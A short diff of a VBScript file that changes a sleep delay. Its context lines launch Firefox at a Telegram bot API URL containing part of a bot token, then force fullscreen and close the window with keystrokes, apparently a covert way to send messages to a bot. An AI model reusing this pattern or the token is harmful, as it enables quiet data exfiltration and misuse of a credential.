@@ -164,7 +164,7 @@ wShell.Run "firefox.exe https://api.telegram.org/bot807217173:AAFN5GEAp1raqS7vNo
 
 WShell.SendKeys "{F11}"
 
-Wscript.Sleep 3000
+Wscript.Sleep 10000
 WShell.SendKeys "%{F4}"
 WShell.SendKeys "{ENTER}"
 
